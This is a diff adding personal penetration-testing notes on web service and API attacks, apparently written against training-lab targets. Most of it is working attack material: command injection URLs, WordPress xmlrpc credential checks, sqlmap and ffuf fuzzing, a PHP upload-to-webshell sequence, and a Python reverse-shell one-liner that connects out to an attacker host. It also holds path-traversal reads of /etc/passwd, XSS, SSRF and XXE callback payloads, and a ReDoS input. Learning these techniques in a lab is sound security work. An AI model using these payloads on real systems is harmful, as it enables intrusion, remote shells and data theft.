@@ -1,0 +1,199 @@
+  _________________________________________
+ |        WEB SERVICE & API ATTACKS        |
+ |_________________________________________|
+ 
+A little bit of theory:
+- The terms web service and application programming interface (API)
+  should not be used interchangeably in every case.
+- Web services are a type of application programming interface (API). The opposite is not always true!
+--------------
+-RPC - Remote Procedure Calling protocol
+-XML-RPC
+-JSON-RPC
+-SOAP (Simple Object Access Protocol)
+ Anatomy of a SOAP Message:
+ -soap:Envelope
+ -soap:Header
+ -soap:Body
+ -soap:Fault
+-WS-BPEL (Web Services Business Process Execution Language)
+-RESTful (Representational State Transfer)
+ La transferencia de estado representacional
+ (REST) es una arquitectura de software que
+ impone condiciones sobre cómo debe funcionar una API.
+--------------------------------
+|||WSDL (Web Service Description Language).
+ - WSDL is an XML-based file exposed by web services 
+   that informs clients of the provided services/methods.
+ - WSDL files can be found in many forms, such as /example.wsdl, ?wsdl, /example.disco, ?disco
+ - DISCO is a Microsoft technology for publishing and discovering Web Services.
+
+method functions like "object" in programming for WSDL.
+
+|||WSDL:
+
+/wsdl?wsdl
+/disco?disco
+--------------------------------
+|||SOAPAction Spoofing:
+
+curl http://<TARGET IP>:3002/wsdl?wsdl
+python3 client.py
+python3 client_soapaction_spoofing.py
+python3 automate.py
+--------------------------------
+|||Command Injection:
+
+sudo tcpdump -i tun0 icmp
+http://10.129.202.133:3003/ping-server.php/system/id
+http://<TARGET IP>:3003/ping-server.php/system/ls
+http://10.129.202.133:3003/ping-server.php/ping/10.10.14.159/3
+http://10.129.202.133:3003/ping-server.php/system/%7Bcmd%7D      (URL encoded)
+---------------------------------
+|||Attacking Wordpress 'xmlrpc.php':
+
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>WRONG-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+
+curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+
+Inside the list of available methods above, pingback.ping is included. pingback.ping allows for XML-RPC pingbacks.
+
+a pingback is a special type of comment that’s created when you link to another blog post, as long as the other blog is set to accept pingbacks.
+
+if xmlrpc.php is enabled and the pingback.ping method is available. XSPA and DDoS attacks can be mounted similarly.
+--------------------------------
+|||Information Disclousure (with a twist of SQLi):
+
+
+https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
+wordlists: burp-parameter-names.txt
+____
+sqlmap -u "http://10.129.88.250:3003/?id=1" -p id
+sqlmap -u "http://example.com/?id=*" -p id
+
+ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19
+
+curl http://<TARGET IP>:3003/?id=1
+-------------------------------
+|||Arbitrary File Upload:
+
+PHP File Upload via API to RCE
+
+/api/upload
+application/x-php
+application/octet-stream
+text/plain
+.jpg.php, .PHP, etc
+
+http://<TARGET IP>:3001/uploads/backdoor.php
+
+python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.159",3001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+
+inspect, go to network, check the right side and search for content type to see if the website allow: application/x-php
+
+this will looks like: "Your file is uploaded to /uploads/backdoor.php"
+
+nc -nlvp 3001
+
+python3 webshell.py -t http://10.129.123.156:3001/uploads/backdoor.php -o yes
+
+inside the connected machine, use: 
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[tun0 interface ip machine]",[netcat listening port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+
+now we can run bash commands like: hostnamectl, ls, id, whoami, pwd, and much more
+--------------------------------
+||| LFI (VULNERABLE API)
+
+curl http://<TARGET IP>:3000/api
+curl http://<TARGET IP>:3000/api/download
+curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
+curl http://10.129.228.11:3000/api/download/..%2f..%2f..%2f..%2fetc%2fpasswd
+ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
+
+
+_______
+common-api-endpoints-mazen160.txt
+/api/download
+--------------------------------
+|||CROSS SITE SCRIPTING (XSS)
+
+http://<TARGET IP>:3000/api/download
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+______
+url encode from bash:
+
+printf %s '<script>alert(document.domain)</script>'|jq -sRr @uri
+printf %s\\n 'multiple lines' 'of text'|jq -Rr @uri
+printf %s\\n 'multiple lines' 'of text'|jq -sRr @uri
+--------------------------------
+|||SSRF
+
+Exploiting SSRF vulnerabilities can lead to:
+ - Interacting with known internal systems
+ - Discovering internal services via port scans
+ - Disclosing local/sensitive data
+ - Including files in the target application
+ - Leaking NetNTLM hashes using UNC Paths (Windows)
+ - Achieving remote code execution
+______
+nc -nlvp <PORT>
+curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
+echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
+curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
+
+--------------------------------
+|||ReDoS
+
+http://10.129.202.133:3000/api/check-email?email=test_value
+curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
+____
+resources:
+https://regex101.com/
+https://jex.im/regulex/#!flags=&re=%5E(%5Ba-zA-Z0-9_.-%5D)%2B%40((%5Ba-zA-Z0-9-%5D)%2B.)%2B(%5Ba-zA-Z0-9%5D%7B2%2C4%7D)%2B%24
+
+--------------------------------
+|||XXE
+
+POST /api/login HTTP/1.1
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "tun0_IP:4444"> 
+]>
+<root>
+<email>
+&somename;
+</email>
+<password>
+P@ssw0rd123
+</password>
+</root>
+____________
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
+<root>
+<email>test@test.com</email>
+<password>P@ssw0rd123</password>
+</root>
+____________
+
+ sudo nc -nlvp 4444
+
+curl -X POST http://10.129.202.133:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://10.10.15.249:4444"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
+
+curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
+--------------------------------
+--------------------------------
+--------------------------------
+--------------------------------
+--------------------------------
+|            THEORY            |
+--------------------------------
+--------------------------------
+https://codex.wordpress.org/XML-RPC/system.listMethods
+https://wordpress.com/support/comments/pingbacks/
+https://codex.wordpress.org/XML-RPC_Pingback_API
+
